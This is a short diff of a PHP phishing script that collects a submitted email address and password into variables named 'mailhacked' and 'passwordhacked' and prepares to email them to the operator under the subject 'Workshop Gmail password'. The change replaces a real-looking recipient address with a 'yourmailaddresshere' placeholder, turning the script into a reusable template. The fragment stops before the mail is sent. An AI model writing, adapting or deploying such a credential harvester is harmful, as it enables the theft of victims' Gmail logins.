@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "iantmanojkashyap@gmail.com";
+         $to = "yourmailaddresshere@gmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
